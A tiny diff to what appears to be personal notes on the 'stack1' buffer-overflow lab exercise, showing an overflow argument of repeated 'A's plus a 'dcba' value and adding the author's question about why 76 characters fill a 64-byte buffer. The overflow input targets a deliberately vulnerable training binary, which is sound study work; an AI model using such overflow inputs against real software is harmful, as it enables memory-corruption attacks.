@@ -7,3 +7,5 @@ To do this we just need to fill up the buffer by passing an arg of length 64 + 1
 
 `./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMdcba
 `
+
+Need to work out why its 76 chars to write the whole of buffer when the buffer size is 64
